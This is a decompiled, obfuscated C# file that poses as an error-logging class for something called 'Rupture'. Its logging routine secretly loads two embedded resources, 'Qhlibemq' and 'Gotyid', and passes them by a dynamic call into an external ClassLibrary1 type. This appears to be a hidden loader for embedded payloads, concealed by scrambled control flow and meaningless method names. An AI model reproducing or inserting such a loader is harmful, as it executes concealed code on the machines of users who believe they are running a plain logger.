using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using ClassLibrary1;
using Microsoft.CSharp.RuntimeBinder;

namespace SHNB83.Listeners;

internal static class Tag
{
	private static StreamWriter _Watcher;

	private static Tag CustomizeUtils;

	internal static void FlushExporter(string i)
	{
		int num = 0;
		object arg = default(object);
		object arg2 = default(object);
		object arg3 = default(object);
		string path = default(string);
		while (true)
		{
			bool flag = num < 15;
			int num2 = 2;
			while (!flag)
			{
				DateTime now = DateTime.Now;
				int num3 = 4;
				if (FlushUtils() != null)
				{
					num3 = num2;
				}
				while (true)
				{
					string value;
					switch (num3)
					{
					case 4:
						if (_Watcher == null)
						{
							num2 = 3;
							goto case 3;
						}
						goto IL_01a6;
					case 3:
						arg = Activator.CreateInstance(PublishUtils(typeof(ClassLibrary1).TypeHandle));
						arg2 = CollectExporter("Qhlibemq");
						arg3 = CollectExporter("Gotyid");
						num3 = 0;
						if (!SetUtils())
						{
							continue;
						}
						goto default;
					case 2:
						break;
					case 1:
						goto end_IL_008c;
					default:
					{
						if (_003C_003Eo__1.queue == null)
						{
							_003C_003Eo__1.queue = CallSite<Action<CallSite, object, object, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "ClassLibrary", null, typeof(Tag), new CSharpArgumentInfo[4]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
								(CSharpArgumentInfo)StartUtils(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						_003C_003Eo__1.queue.Target(_003C_003Eo__1.queue, arg, arg2, arg3, "InstantiateGetter");
						string text = Path.Combine((string)ResetUtils(Environment.SpecialFolder.LocalApplicationData), "Rupture");
						if (!Directory.Exists(text))
						{
							VisitUtils(text);
						}
						path = Path.Combine(text, string.Format("Rupture Error Log - {0}.txt", now.ToString("MM-dd-yyyy")));
						if (File.Exists(path))
						{
							goto case 5;
						}
						_Watcher = new StreamWriter(File.Create(path));
						goto IL_01a6;
					}
					case 5:
						{
							_Watcher = new StreamWriter(File.Open(path, FileMode.Append));
							goto IL_01a6;
						}
						IL_01a6:
						value = string.Format("[Entry {0}]: {1}", now.ToString("MM-dd-yyyy hh:mm tt"), i);
						_Watcher.WriteLine(value);
						_Watcher.Flush();
						Console.WriteLine(value);
						return;
					}
					break;
				}
				continue;
				end_IL_008c:
				break;
			}
			Thread.Sleep(999);
			num++;
		}
	}

	private static byte[] CollectExporter(string config)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		object obj = executingAssembly.GetManifestResourceNames().SingleOrDefault((string r) => r.Contains(config));
		if (obj == null)
		{
			if (FlushUtils() == null)
			{
				switch (0)
				{
				case 1:
				{
					byte[] result = default(byte[]);
					return result;
				}
				}
			}
			obj = "";
		}
		string object_ = (string)obj;
		Stream stream = (Stream)MoveUtils(executingAssembly, object_);
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		return array;
	}

	internal static void AssetExporter(string i, params string[] values)
	{
		FlushExporter(string.Format(i, values));
	}

	internal static Type PublishUtils(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static object StartUtils(CSharpArgumentInfoFlags csharpArgumentInfoFlags_0, object object_0)
	{
		return CSharpArgumentInfo.Create(csharpArgumentInfoFlags_0, (string?)object_0);
	}

	internal static object ResetUtils(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	internal static object VisitUtils(object object_0)
	{
		return Directory.CreateDirectory((string)object_0);
	}

	internal static bool SetUtils()
	{
		return CustomizeUtils == null;
	}

	internal static Tag FlushUtils()
	{
		return CustomizeUtils;
	}

	internal static object MoveUtils(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetManifestResourceStream((string)object_1);
	}
}
